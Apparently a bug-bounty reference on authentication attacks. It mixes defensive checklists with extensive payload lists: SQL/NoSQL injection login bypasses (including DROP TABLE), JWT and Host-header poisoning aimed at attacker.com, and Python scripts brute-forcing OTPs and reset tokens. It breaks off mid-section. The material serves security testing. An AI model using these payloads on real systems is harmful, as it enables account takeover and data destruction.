# Authentication Failures - Comprehensive Bug Bounty Knowledgebase

> **Research-grade knowledgebase for advanced bug bounty hunting and black-box testing**
> 
> **Version:** 2026.05 | **Sources:** PortSwigger Academy, HackTricks, OWASP, ProjectDiscovery, Bugcrowd, Medium Writeups, MDN Web Docs, and 40+ reference links
> 
> **Classification:** Authentication Bypass, Session Management, MFA/2FA Bypass, Password Reset Poisoning, OAuth Abuse, Cache Poisoning Chains, Request Smuggling Chains

---

## Table of Contents

1. [Basics](#1-basics)
2. [Authentication Theory](#2-authentication-theory)
3. [Session Management Internals](#3-session-management-internals)
4. [Authentication Bypass Payloads](#4-authentication-bypass-payloads)
5. [MFA Bypass Techniques](#5-mfa-bypass-techniques)
6. [Password Reset Poisoning](#6-password-reset-poisoning)
7. [Session Fixation Attacks](#7-session-fixation-attacks)
8. [Session Puzzling Attacks](#8-session-puzzling-attacks)
9. [Magic Link Abuse](#9-magic-link-abuse)
10. [Remember-Me Token Abuse](#10-remember-me-token-abuse)
11. [Brute-Force Bypass Techniques](#11-brute-force-bypass-techniques)
12. [Username Enumeration Payloads](#12-username-enumeration-payloads)
13. [OAuth + Authentication Chains](#13-oauth--authentication-chains)
14. [Cache Poisoning + Authentication Chains](#14-cache-poisoning--authentication-chains)
15. [Request Smuggling + Authentication Chains](#15-request-smuggling--authentication-chains)
16. [Parser Confusion Payloads](#16-parser-confusion-payloads)
17. [Browser Quirks](#17-browser-quirks)
18. [Gadget Chains](#18-gadget-chains)
19. [Real World Case Studies](#19-real-world-case-studies)
20. [Fuzzing Payloads](#20-fuzzing-payloads)
21. [Automation Workflows](#21-automation-workflows)
22. [Recon Methodology](#22-recon-methodology)
23. [Nuclei Templates](#23-nuclei-templates)
24. [Tools and Scanners](#24-tools-and-scanners)
25. [Advanced Research](#25-advanced-research)
26. [Bug Bounty Writeups](#26-bug-bounty-writeups)
27. [Payload Collections](#27-payload-collections)
28. [Detection Techniques](#28-detection-techniques)
29. [References](#29-references)

---

## 1. Basics

### 1.1 What is Authentication?

Authentication is the process of verifying that a user is who they claim to be. It is the first line of defense in access control systems and forms the foundation of session management.

**Core Components:**
- **Identification:** Claiming an identity (username, email, ID)
- **Verification:** Proving the claim (password, token, biometric)
- **Authentication Result:** Success/failure decision with session establishment

### 1.2 Common Authentication Factors

| Factor Type | Examples | Security Level |
|-------------|----------|----------------|
| Knowledge | Passwords, PINs, security questions | Low-Medium |
| Possession | SMS codes, OTP apps, hardware tokens | Medium-High |
| Inherence | Biometrics (fingerprint, face, voice) | High |
| Location | IP geofencing, GPS verification | Medium |
| Time | Time-based OTP (TOTP), time windows | Medium |

### 1.3 Authentication vs Authorization

- **Authentication (AuthN):** Verifying identity ("Who are you?")
- **Authorization (AuthZ):** Determining permissions ("What can you do?")

> **Critical Bug Bounty Insight:** Authentication bypasses are typically higher severity than authorization flaws because they enable the initial foothold. However, chaining AuthN bypass -> AuthZ escalation -> Data exfiltration is the path to maximum impact.

### 1.4 Common Authentication Mechanisms

```
+-------------------------------------------------------------+
|                    AUTHENTICATION MECHANISMS                 |
+-------------------------------------------------------------+
| 1. Password-Based        -> Username + Password             |
| 2. Token-Based           -> JWT, API Keys, Bearer Tokens    |
| 3. Session-Based         -> Session IDs in Cookies/URL      |
| 4. Multi-Factor (MFA)    -> Password + OTP/Biometric        |
| 5. OAuth/OpenID Connect  -> Third-party identity providers  |
| 6. SAML                  -> Enterprise SSO federation       |
| 7. Certificate-Based     -> Client TLS certificates         |
| 8. WebAuthn/FIDO2        -> Public key cryptography         |
| 9. Magic Links           -> Email-based one-time URLs       |
| 10. Biometric            -> Fingerprint, Face, Iris          |
+-------------------------------------------------------------+
```

---

## 2. Authentication Theory

### 2.1 HTTP Authentication Framework (RFC 7235)

The HTTP authentication framework uses challenge-response flow:

```
Client Request        -> GET /admin HTTP/1.1
Server Challenge      -> 401 Unauthorized
                        WWW-Authenticate: Basic realm="Admin Area"
Client Response       -> GET /admin HTTP/1.1
                        Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Server Validation     -> 200 OK (if valid) or 403 Forbidden (if inadequate)
```

**Authentication Schemes:**
- `Basic` - Base64-encoded credentials (RFC 7617) - **INSECURE without HTTPS**
- `Bearer` - OAuth 2.0 tokens (RFC 6750)
- `Digest` - Challenge-response with MD5/SHA-256 (RFC 7616)
- `HOBA` - HTTP Origin-Bound Authentication (RFC 7486)
- `Mutual` - Mutual authentication (RFC 8120)
- `Negotiate` / `NTLM` - Windows authentication (RFC 4559)
- `SCRAM` - Salted Challenge Response (RFC 7804)
- `AWS4-HMAC-SHA256` - AWS signature v4

### 2.2 Password-Based Authentication Flow

```
+----------+                    +----------+                    +----------+
|  Client  |---1. POST /login-->|  Server  |---2. Validate----->| Database |
|          |   username=admin   |          |   Hash(password)   |          |
|          |   password=pass   |          |   Compare hash     |          |
|          |<--3. Set-Cookie----|          |<--4. Result--------|          |
|          |   session=abc123  |          |   Match/Mismatch   |          |
|          |<--5. 302 Redirect--|          |                    |          |
+----------+   Location: /home  +----------+                    +----------+
```

### 2.3 Multi-Factor Authentication Flow

```
+----------+                    +----------+                    +----------+
|  Client  |---1. POST /login-->|  Server  |---2. Validate----->| Database |
|          |   username=admin   |          |   First factor      |          |
|          |   password=pass    |          |   (password)        |          |
|          |<--3. 302 /login2---|          |<--4. Result---------|          |
|          |   Set-Cookie: sess |          |   Password valid    |          |
|          |                    |          |                    |          |
|          |---5. POST /login2->|          |---6. Validate------>|  OTP     |
|          |   mfa-code=123456  |          |   Second factor     | Service  |
|          |   csrf=token        |          |   (OTP/TOTP)        |          |
|          |<--7. 302 /home------|          |<--8. Result---------|          |
|          |   Set-Cookie: auth |          |   OTP valid         |          |
+----------+                    +----------+                    +----------+
```

### 2.4 OAuth 2.0 / OpenID Connect Flow

```
+----------+         +----------+         +----------+         +----------+
|  Client  |--(1)--->|  Server  |--(2)--->|   IdP    |         |          |
|  (User)  | Auth    |  (RP)    | Redirect| (Google) |         |          |
|          | Request |          | to IdP  |          |         |          |
|          |<-(3)-----|          |<-(4)-----|          |         |          |
|          | Login   |          | Auth    |          |         |          |
|          | Consent |          | Code    |          |         |          |
|          |         |<-(5)------|          |         |         |          |
|          |         |  Token  |          |         |         |          |
|          |         |  Request|          |         |         |          |
|          |         |<-(6)------|          |         |         |          |
|          |         |  ID     |          |         |         |          |
|          |         |  Token  |          |         |         |          |
|          |         |  Access |          |         |         |          |
|          |         |  Token  |          |         |         |          |
+----------+         +----------+         +----------+         +----------+
```

### 2.5 OWASP Top 10 - Broken Authentication (A2:2017 / A7:2021)

**Vulnerability Indicators:**
- Permits automated attacks (credential stuffing, brute force)
- Permits default/weak passwords ("Password1", "admin/admin")
- Uses weak credential recovery (knowledge-based answers)
- Stores passwords in plain text, encrypted, or weakly hashed
- Missing or ineffective multi-factor authentication
- Exposes session IDs in URL (URL rewriting)
- Does not rotate session IDs after login
- Does not properly invalidate sessions on logout/timeout

**Prevention:**
- Implement multi-factor authentication where possible
- Do not ship with default credentials
- Implement weak-password checks against top 10,000 worst passwords
- Align with NIST 800-63 B guidelines
- Harden registration/recovery/API paths against account enumeration
- Limit and delay failed login attempts; log and alert
- Use server-side secure session manager with high-entropy random session IDs
- Session IDs should not be in URL, securely stored, invalidated after logout/idle/absolute timeouts

---

## 3. Session Management Internals

### 3.1 Session Lifecycle

```
+-------------+    +-------------+    +-------------+    +-------------+
|  Creation   |--->|  Active     |--->|  Expiration |--->|  Destruction|
|             |    |             |    |             |    |             |
| - First     |    | - Cookie    |    | - Idle      |    | - Logout    |
|   visit     |    |   exchange  |    |   timeout   |    | - Timeout   |
| - Login     |    | - State     |    | - Absolute  |    | - Invalid   |
|             |    |   storage   |    |   timeout   |    |   token     |
+-------------+    +-------------+    +-------------+    +-------------+
```

### 3.2 Cookie Security Attributes

```http
Set-Cookie: session=abc123; 
  Expires=Thu, 31 Oct 2024 07:28:00 GMT;  # Permanent cookie
  Max-Age=2592000;                          # 30 days
  Secure;                                    # HTTPS only
  HttpOnly;                                  # No JavaScript access
  SameSite=Strict;                           # CSRF protection
  Domain=example.com;                        # Scope: domain + subdomains
  Path=/admin;                               # Scope: path + subpaths
  __Host-;                                   # Prefix: Secure, Path=/, no Domain
  __Secure-;                                 # Prefix: Secure required
```

**Cookie Prefixes (Defense in Depth):**
- `__Host-`: Must have Secure, Path=/, no Domain attribute
- `__Secure-`: Must have Secure attribute
- `__Http-`: Must have Secure + HttpOnly
- `__Host-Http-`: Combines all above restrictions

### 3.3 Session Token Generation Requirements

```
[x] Cryptographically random (CSPRNG)
[x] Minimum 128 bits of entropy
[x] Unpredictable and unguessable
[x] Unique across all sessions
[x] Regenerated after privilege change (login, password change, MFA enable)
[x] Invalidated on logout, idle timeout, absolute timeout
[x] Not exposed in URL, logs, or error messages
[x] Server-side storage only (never client-side except opaque reference)
```

### 3.4 Session Storage Patterns

| Pattern | Description | Risk Level |
|---------|-------------|------------|
| Server-side sessions | Session data stored server-side, cookie contains only session ID | Low |
| Client-side sessions | JWT stored in cookie/localStorage | Medium-High |
| Hybrid | Server-side state + JWT for distributed systems | Medium |
| Encrypted client-side | Encrypted session data in cookie | Medium |

### 3.5 Session Validation Checklist

```
[x] Session ID regenerated after successful authentication
[x] Session ID regenerated after privilege escalation
[x] Old session invalidated on new login (prevent concurrent sessions)
[x] Session bound to IP address (optional, may break mobile/rotating IPs)
[x] Session bound to User-Agent (optional, may break browser updates)
[x] Session bound to TLS session (optional, may break TLS resumption)
[x] Idle timeout enforced (e.g., 15-30 minutes)
[x] Absolute timeout enforced (e.g., 8-24 hours)
[x] Concurrent session limit enforced
[x] Session invalidation on logout (server-side deletion)
[x] Session invalidation on password change
[x] Session invalidation on MFA enable/disable
[x] No session fixation vulnerability (see Section 7)
[x] Session data not leaked in error messages
[x] Session not stored in browser history/URL
```

---

## 4. Authentication Bypass Payloads

### 4.1 SQL Injection Authentication Bypass

**Basic Payloads:**
```sql
-- Standard comment-based bypass
admin'--
admin'#
admin'/*

-- Boolean-based bypass
' OR '1'='1
' OR 1=1--
' OR 1=1#
" OR ""="
" OR 1=1--

-- Union-based bypass
' UNION SELECT * FROM users WHERE '1'='1

-- Time-based bypass (blind)
' OR SLEEP(5)--
' OR pg_sleep(5)--

-- Stacked queries
'; DROP TABLE users;--
'; INSERT INTO admins VALUES ('attacker','pass');--

-- Alternative comment styles
admin';--
admin';
admin'-- -
admin'--+

-- Encoding variations
admin%27--
admin%27%23
admin%27%2D%2D
admin%2527-- (double URL encoded)

-- Unicode smuggling
admin\u0027--
admin\x27--

-- Multibyte character bypass (MySQL)
admin%df%27--

-- JSON-based login bypass
{"username":"admin'--","password":"anything"}
{"username":"admin' OR '1'='1","password":"anything"}

-- NoSQL injection bypass
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":".*"},"password":{"$ne":null}}

-- LDAP injection bypass
*)(uid=*))(&(uid=*
*)(uid=*))(|(uid=*
*)(uid=*))(&(uid=*))(&(uid=*

-- XPath injection bypass
' or '1'='1
' or ''='
' or 1=1 or ''='
```

**Database-Specific Payloads:**
```sql
-- MySQL
' OR 1=1 LIMIT 1--
' UNION SELECT 1,2,3 FROM information_schema.tables--

-- PostgreSQL
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--

-- MSSQL
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' OR 1=1--
' UNION SELECT NULL FROM DUAL--

-- SQLite
' OR 1=1--
' UNION SELECT sqlite_version(),NULL--
```

### 4.2 Response Manipulation Bypass

```
# Response modification techniques
# Intercept response and modify JSON/XML/HTML

# JSON response manipulation
{"success":false} -> {"success":true}
{"authenticated":false} -> {"authenticated":true}
{"status":"error"} -> {"status":"success"}
{"valid":false} -> {"valid":true}
{"authorized":0} -> {"authorized":1}

# XML response manipulation
<success>false</success> -> <success>true</success>
<authenticated>0</authenticated> -> <authenticated>1</authenticated>

# Status code manipulation
HTTP/1.1 401 Unauthorized -> HTTP/1.1 200 OK
HTTP/1.1 403 Forbidden -> HTTP/1.1 200 OK
HTTP/1.1 302 Found -> HTTP/1.1 200 OK (with body)

# Header manipulation
Location: /login -> Remove header
WWW-Authenticate: Basic realm="..." -> Remove header
X-Frame-Options: DENY -> Remove header (for clickjacking)
```

### 4.3 Parameter Pollution / Array Bypass

```
# Parameter pollution to bypass validation
# When backend uses first/last occurrence of parameter

# First parameter valid, second malicious
username=admin&username=attacker
password=valid&password=wrong

# Array-based bypass
username[]=admin&username[]=attacker
password[]=valid&password[]=wrong

# Nested parameter bypass
user[name]=admin&user[role]=admin
user[password]=valid&user[password]=wrong

# JSON parameter pollution
{"username":"admin","username":"attacker"}
{"password":"valid","password":"wrong"}
```

### 4.4 Header-Based Bypass

```http
# X-Original-URL bypass
X-Original-URL: /admin/dashboard

# X-Rewrite-URL bypass
X-Rewrite-URL: /admin/users

# X-Forwarded-Prefix bypass
X-Forwarded-Prefix: /admin

# Referer-based bypass
Referer: https://target.com/admin/dashboard

# Origin manipulation
Origin: https://target.com

# Host header bypass
Host: target.com
X-Forwarded-Host: target.com
X-Forwarded-Server: target.com

# IP-based bypass
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Custom admin headers
X-Admin: true
X-Admin-Token: true
X-Is-Admin: 1
X-Role: admin
X-User-Role: administrator
X-Access-Level: 9
X-Internal-Request: 1
X-Internal-User: true
```

### 4.5 Path-Based Bypass

```
# Case variation
/Admin
/ADMIN
/aDmIn

# URL encoding
/%61dmin
/%41dmin
/%2561dmin (double encoded)

# Path traversal
/admin/../admin
/admin/./dashboard
/admin/;/dashboard
/admin//dashboard
/admin/dashboard/
/admin/dashboard/.

# Null byte (legacy PHP)
/admin%00
/admin%00/dashboard

# Unicode normalization
/ädmin (ä -> a in some normalization forms)
/аdmin (Cyrillic а looks like Latin a)

# Alternative path separators
/admin\dashboard
/admin/dashboard%2f

# Fragment-based bypass
/admin#dashboard
/admin?next=/dashboard

# Matrix parameter bypass
/admin;param=value/dashboard
```

### 4.6 JWT Authentication Bypass

```
# Algorithm confusion (alg: none)
{"alg":"none","typ":"JWT"}.{"user":"admin","role":"admin"}.

# Algorithm switching (RS256 -> HS256)
# Use public key as HMAC secret

# Weak secret brute force
# Use jwt_tool or hashcat to crack weak secrets

# Kid header injection
{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}

# JWK header injection
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"..."}}

# JKU header injection
{"alg":"RS256","jku":"https://attacker.com/key.json"}

# x5u header injection
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}

# Empty signature
# Remove signature portion and change alg to none

# Payload manipulation
# Change role: user -> admin
# Change id: 123 -> 1 (first admin)
```

### 4.7 SAML Authentication Bypass

```xml
<!-- SAML Response Wrapping -->
<samlp:Response>
  <saml:Assertion ID="legitimate">
    <!-- legitimate assertion -->
  </saml:Assertion>
  <saml:Assertion ID="malicious">
    <!-- attacker-controlled assertion -->
  </saml:Assertion>
</samlp:Response>

<!-- Comment injection -->
<saml:Assertion ID="legitimate">-->
  <!-- malicious content -->
<!--</saml:Assertion>

<!-- XSW1: Duplicate signed assertion -->
<!-- XSW2: Insert wrapped assertion -->
<!-- XSW3: Clone assertion with different ID -->
<!-- XSW4: Clone assertion and modify signature -->
<!-- XSW5: Place original assertion in Extensions -->
<!-- XSW6: Place original assertion in Advice -->
<!-- XSW7: Clone assertion with embedded original -->
<!-- XSW8: Clone assertion with sibling original -->
```

### 4.8 API Authentication Bypass

```
# API key in query parameter bypass
/api/v1/users?api_key=invalid&api_key=valid

# API key in header bypass
X-API-Key: invalid
X-Api-Key: valid
Authorization: Bearer invalid
Authorization: Bearer valid

# Version-based bypass
/api/v1/admin -> /api/v2/admin (different auth checks)
/api/v1/users -> /api/internal/users

# Content-Type bypass
Content-Type: application/json -> application/xml
Content-Type: application/x-www-form-urlencoded

# Method-based bypass
GET /admin -> POST /admin
PUT /admin -> PATCH /admin
DELETE /admin -> OPTIONS /admin

# Parameter-based bypass
/api/users?id=1 -> /api/users?id=1&admin=true
/api/users/1 -> /api/users/1?role=admin
```

### 4.9 Forced Browsing / Direct Access

```
# Common admin endpoints
/admin
/administrator
/adminpanel
/admincp
/cpanel
/dashboard
/manager
/management
/console
/system
/backend
/portal
/control
/master
/root
/superuser

# Common API endpoints
/api/admin
/api/v1/admin
/api/internal
/api/debug
/api/management
/api/system

# Common file paths
/.env
/config.php
/config.yaml
/config.json
/.htaccess
/.git/config
/robots.txt
/sitemap.xml
/crossdomain.xml

# Backup files
/admin.bak
/admin.php~
/admin.php.bak
/admin.php.swp
/admin.php.save
/admin.php.orig
/admin.php.old
/admin.php.new
/admin.php.copy
```

### 4.10 Authentication Bypass via Logic Flaws

```
# Step-by-step flow bypass
# If auth is multi-step, skip intermediate steps

# Step 1: POST /login (username only)
# Step 2: POST /login/verify (password only)
# Bypass: POST /login/verify directly with both fields

# Registration flow bypass
# Register with admin email but different username
# Verify email, then change username to admin

# Password reset flow bypass
# Request reset for victim, then use your own reset link
# Change email to victim's after requesting reset

# OAuth flow bypass
# Change redirect_uri to attacker domain
# Remove state parameter
# Replay authorization code

# MFA flow bypass
# Skip /login2 and go directly to /dashboard
# Use old session cookie after enabling MFA
# Disable MFA via API without re-authentication
```

---

## 5. MFA Bypass Techniques

### 5.1 Response Manipulation

```
# Intercept MFA challenge response and modify

# JSON response modification
{"requires_2fa":true} -> {"requires_2fa":false}
{"mfa_required":true} -> {"mfa_required":false}
{"two_factor_enabled":true} -> {"two_factor_enabled":false}

# Status code manipulation
HTTP/1.1 403 MFA Required -> HTTP/1.1 200 OK

# Remove MFA-related fields from response
# Add skip_mfa=true to request
```

### 5.2 Brute Force OTP

```python
# Python script for OTP brute force
import requests
import threading
from time import sleep

def brute_otp(url, session_cookie, csrf_token, start, end):
    headers = {
        'Cookie': f'session={session_cookie}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for code in range(start, end):
        data = {
            'mfa-code': f'{code:04d}',
            'csrf': csrf_token
        }

        response = requests.post(url, data=data, headers=headers, allow_redirects=False)

        if response.status_code == 302 and '/home' in response.headers.get('Location', ''):
            print(f"[+] OTP found: {code:04d}")
            return True

        # Reset session every 2 attempts (PortSwigger lab pattern)
        if code % 2 == 1:
            # Re-authenticate to get new session
            pass

    return False

# Threaded approach for speed
threads = []
for i in range(10):
    t = threading.Thread(target=brute_otp, args=(url, cookie, csrf, i*1000, (i+1)*1000))
    threads.append(t)
    t.start()
```

### 5.3 Session Fixation + MFA Bypass

```
# Attack chain:
1. Attacker logs in with valid credentials (reaches MFA step)
2. Attacker captures session cookie at /login2
3. Attacker sends phishing link with same session ID to victim
4. Victim completes MFA with their credentials
5. Attacker uses the now-authenticated session cookie

# Implementation:
# Step 1: Get pre-auth session
GET /login -> Set-Cookie: session=ATTACKER_SESSION

# Step 2: Login with credentials
POST /login -> 302 /login2 (same session)

# Step 3: Deliver session to victim
# Victim completes MFA -> session now authenticated

# Step 4: Attacker uses session
GET /dashboard -> Cookie: session=ATTACKER_SESSION -> 200 OK
```

### 5.4 MFA Disable without Re-authentication

```
# CSRF on MFA disable endpoint
# No password confirmation required

POST /settings/disable-2fa HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

# No CSRF token, no password confirmation
# Victim visits malicious page -> MFA disabled

# Clickjacking on MFA disable page
# iframe the disable page, trick user into clicking
```

### 5.5 Backup Code Abuse

```
# Backup codes generated once, reusable
# Brute force backup codes if no rate limiting

# Generate backup codes and use them instead of OTP
POST /login/backup-code
backup-code=12345678

# Backup codes not invalidated after use
# Same code works multiple times

# Backup codes have predictable patterns
# Sequential: 00000001, 00000002, etc.
# Based on user ID or timestamp
```

### 5.6 Null / Default OTP Bypass

```
# Try default/null OTP values
000000
00000000
null
NULL
None
none
0
123456
111111
222222

# Try empty OTP field
mfa-code=
mfa-code=""
mfa-code=''

# Try removing OTP parameter entirely
POST /login2
username=admin&password=admin
# (no mfa-code parameter)
```

### 5.7 Time-Based OTP (TOTP) Issues

```
# TOTP seed extraction
# QR code contains otpauth:// URI with secret
# If seed is leaked in response, generate codes indefinitely

# TOTP time window abuse
# Server allows +/-1 or +/-2 time windows
# Generate codes for multiple time windows

# TOTP reuse
# Same code valid for multiple requests within time window

# TOTP algorithm downgrade
# Force server to use weaker algorithm
```

### 5.8 SMS-Based MFA Bypass

```
# SIM swapping
# Social engineer carrier to transfer number

# SMS interception
# Malware on device intercepts SMS
# SS7 attacks on telecom infrastructure

# SMS brute force
# 4-digit code: 0000-9999 (10,000 combinations)
# 6-digit code: 000000-999999 (1,000,000 combinations)
# With rate limiting bypass via IP rotation

# SMS flooding
# Request multiple codes, use any valid one
# Race condition: request code, use first received
```

### 5.9 Push Notification Bypass

```
# Push notification fatigue
# Flood user with push requests until they accept

# MFA fatigue attack (real-world: Uber, Microsoft)
# 2022 Uber breach: attacker spammed push notifications
# User eventually accepted to stop notifications

# Push notification interception
# Compromised device can auto-approve
```

### 5.10 MFA Bypass via Password Reset

```
# Password reset flow skips MFA
# Change password -> logged in without MFA challenge

# Steps:
1. Attacker has victim's email access
2. Request password reset
3. Click reset link
4. Set new password
5. Automatically logged in without MFA

# Variation: Email change skips MFA
# Change email -> verify new email -> logged in without MFA
```

### 5.11 Content-Type Switching for MFA Bypass

```
# Switch Content-Type to expose MFA data

# Original request:
POST /resend-code
Content-Type: application/json
{"email":"victim@example.com"}

# Modified request:
POST /resend-code
Content-Type: application/xml
<?xml version="1.0"?>
<request>
  <email>victim@example.com</email>
</request>

# Response may leak phone number or other PII
<response>
  <status>ok</status>
  <mfa_phone>+1-555-XXX-XXXX</mfa_phone>
</response>
```

### 5.12 Concurrent Session MFA Bypass

```
# Enable MFA doesn't invalidate existing sessions
# Steps:
1. Attacker steals session cookie before MFA enabled
2. Victim enables MFA
3. Attacker's old session still valid
4. Attacker accesses account without MFA

# Test:
# Login in Browser 1 -> capture session
# Enable MFA in Browser 2
# Use Browser 1 session -> still authenticated
```

---

## 6. Password Reset Poisoning

### 6.1 Host Header Poisoning

```
# Password reset request with poisoned Host header

POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com

email=victim@target.com

# Server generates reset link:
# https://attacker.com/reset?token=abc123
# Attacker receives token if server uses Host header
```

### 6.2 X-Forwarded-Host Poisoning

```
# Middleware-based poisoning
# If application uses X-Forwarded-Host for URL generation:

POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@target.com

# Reset link becomes:
# https://attacker.com/reset?token=abc123
```

### 6.3 Password Reset Token Leakage

```
# Token sent in Referer header to third parties
# Password reset page loads external resources
# Token leaks via Referer to analytics, CDNs, etc.

# Token in URL fragment leaked to JavaScript
# Malicious script reads window.location.hash

# Token in browser history
# Shared computer -> next user sees token in history
```

### 6.4 Broken Password Reset Logic

```
# PortSwigger Lab: Password reset broken logic
# Token checked on GET but not on POST

# Step 1: GET /reset?token=VALID_TOKEN
# Server validates token, shows reset form

# Step 2: POST /reset (no token in POST body!)
# Server resets password for user in hidden field
# Attacker changes hidden field to victim's username

POST /reset HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

token=ATTACKER_TOKEN&username=VICTIM&new-password=hacked123
```

### 6.5 Password Reset Token Prediction

```
# Weak token generation patterns
# Sequential: 000001, 000002, etc.
# Timestamp-based: token = md5(timestamp)
# User ID based: token = md5(user_id + salt)

# Brute force reset tokens
# 6-digit numeric: 000000-999999
# If no rate limiting, brute force in minutes

# Token entropy analysis
# Check token length, character set, patterns
# Use Burp Sequencer for entropy analysis
```

### 6.6 Password Reset via Email Change

```
# Change email to attacker's email
# Request password reset -> token sent to attacker

# Steps:
1. Login to account
2. Change email to attacker@evil.com
3. Request password reset
4. Token sent to attacker
5. Reset password, account compromised

# If email change requires password only (no MFA)
# Or if email change has weaker auth than password reset
```

### 6.7 Password Reset Response Manipulation

```
# Intercept password reset response
# Modify to bypass validation

# Example: Reset requires security questions
# Response contains validation result
{"valid":false} -> {"valid":true}

# Or: Reset requires email verification
# Response contains verified flag
{"email_verified":false} -> {"email_verified":true}
```

### 6.8 Password Reset Brute Force

```python
# Brute force password reset tokens
import requests
import threading

def brute_token(base_url, user_id, start, end):
    for token in range(start, end):
        url = f"{base_url}/reset?token={token:06d}&user={user_id}"
        response = requests.get(url, allow_redirects=False)

        if response.status_code == 200 and "New Password" in response.text:
            print(f"[+] Valid token found: {token:06d}")
            return token
    return None

# Multi-threaded
threads = []
for i in range(20):
    t = threading.Thread(target=brute_token, args=(url, user_id, i*50000, (i+1)*50000))
    threads.append(t)
    t.start()
```

---

## 7. Session Fixation Attacks

### 7.1 Session Fixation Flow

```
+----------+         +----------+         +----------+
| Attacker |--(1)--->|  Server  |         |  Victim  |
|          |  GET /  |          |         |          |
|          |<-(2)-----|          |         |          |
|          |  Set-Cookie: sess=FIXED_ID     |          |
|          |         |          |         |          |
|          |--(3)--->|          |--(4)--->|          |
|          |  Phishing|          |  Victim |          |
|          |  link    |          |  clicks |          |
|          |         |          |         |          |
|          |         |<-(5)-----|<-(6)-----|          |
|          |         |  POST   |  Login  |          |
|          |         |  /login |  creds  |          |
|          |         |  sess=FIXED_ID      |          |
|          |         |          |         |          |
|          |<-(7)-----|          |         |          |
|          |  GET /dashboard     |         |          |
|          |  Cookie: sess=FIXED_ID       |          |
|          |  -> 200 OK (authenticated!)   |          |
+----------+         +----------+         +----------+
```

### 7.2 Session Fixation Payloads

```
# URL parameter injection
https://vulnerable-app.com/login?sessionid=ATTACKER_KNOWN_ID
https://vulnerable-app.com/login?JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1

# Cookie injection via XSS
document.cookie = "sessionid=ATTACKER_KNOWN_ID; path=/; domain=.example.com";

# META tag injection
<meta http-equiv="Set-Cookie" content="sessionid=ATTACKER_KNOWN_ID">

# HTTP response header injection (response splitting)
Content-Length: 0


Set-Cookie: sessionid=ATTACKER_KNOWN_ID





# Cross-subdomain cookie fixation
# If bank.example.com and recipes.example.com share domain:
# Fixate cookie on recipes.example.com -> valid on bank.example.com
```

### 7.3 Session Fixation Detection

```
# Test for session fixation:
1. Visit login page, capture session cookie (Session A)
2. Login with valid credentials
3. Check if session cookie changed
4. If Session A == Session B -> VULNERABLE

# Automated check with curl:
curl -I https://target.com/login | grep -i "set-cookie"
# Capture session ID

curl -X POST https://target.com/login   -d "username=admin&password=admin"   -b "session=CAPTURED_ID"   -I | grep -i "set-cookie"
# If no new Set-Cookie -> VULNERABLE
```

### 7.4 Session Fixation Variants

```
# Variant 1: Accept arbitrary session IDs
# Server accepts attacker-provided session ID
GET /login?sessionid=ATTACKER_ID
-> Set-Cookie: sessionid=ATTACKER_ID

# Variant 2: Session ID in URL persists after login
# Login with ?sessionid=ATTACKER_ID
# Server uses same ID after authentication

# Variant 3: Cookieless session fixation
# Session ID in hidden form field
# Attacker sets hidden field value
# Server accepts same ID after login

# Variant 4: Flash cookie fixation
# Flash cookies (LSOs) not cleared on login
# Attacker sets Flash cookie -> victim inherits

# Variant 5: HTML5 storage fixation
# localStorage/sessionStorage not cleared
# Attacker sets storage values -> victim inherits
```

---

## 8. Session Puzzling Attacks

### 8.1 Session Puzzling Concept

Session puzzling (also called session variable overloading) occurs when an application uses the same session variable for multiple purposes, allowing an attacker to set a session value in one context and have it interpreted differently in another context.

```
+-------------------------------------------------------------+
|                    SESSION PUZZLING FLOW                     |
+-------------------------------------------------------------+
| 1. Attacker visits forgot-password page                     |
|    -> Session created with username=victim                 |
|                                                              |
| 2. Attacker captures session cookie                          |
|    -> Cookie: session=PUZZLE_ID                             |
|                                                              |
| 3. Attacker visits /profile with same cookie                |
|    -> Server reads session['username'] = 'victim'            |
|    -> Returns victim's profile without authentication!       |
+-------------------------------------------------------------+
```

### 8.2 Session Puzzling Attack Vectors

```
# Vector 1: Password reset -> Profile access
# Step 1: POST /forgot-password
#         username=victim
#         -> Set-Cookie: session=PUZZLE_ID
#         -> Server sets session['reset_user'] = 'victim'
# 
# Step 2: GET /profile
#         Cookie: session=PUZZLE_ID
#         -> Server checks session['user'] (not set)
#         -> Falls back to session['reset_user']
#         -> Returns victim's profile

# Vector 2: Guest checkout -> Account access
# Step 1: POST /guest-checkout
#         email=victim@example.com
#         -> Session sets session['email'] = 'victim@example.com'
#
# Step 2: GET /account
#         -> Server uses session['email'] to identify user
#         -> Returns victim's account page

# Vector 3: Newsletter signup -> Admin access
# Step 1: POST /newsletter-signup
#         email=admin@target.com
#         -> Session sets session['email'] = 'admin@target.com'
#
# Step 2: GET /admin
#         -> Server checks session['email'] for admin role
#         -> Grants admin access
```

### 8.3 Session Puzzling Detection Methodology

```
# Testing methodology:
1. Identify all unauthenticated endpoints that set session data
   - Password reset
   - Newsletter signup
   - Guest checkout
   - Contact forms
   - Search functionality
   - Polls/surveys

2. For each endpoint:
   a. Submit data with attacker-controlled values
   b. Capture session cookie
   c. Visit authenticated endpoints with same cookie
   d. Check if attacker-controlled data is used for authorization

3. Look for session variable overlap:
   - Same variable used in auth and non-auth contexts
   - Variable precedence issues (which variable wins?)
   - Default/fallback values that use attacker input
```

### 8.4 Session Puzzling Payloads

```
# Test payload for password reset -> profile access
# Step 1:
POST /forgot-password HTTP/1.1
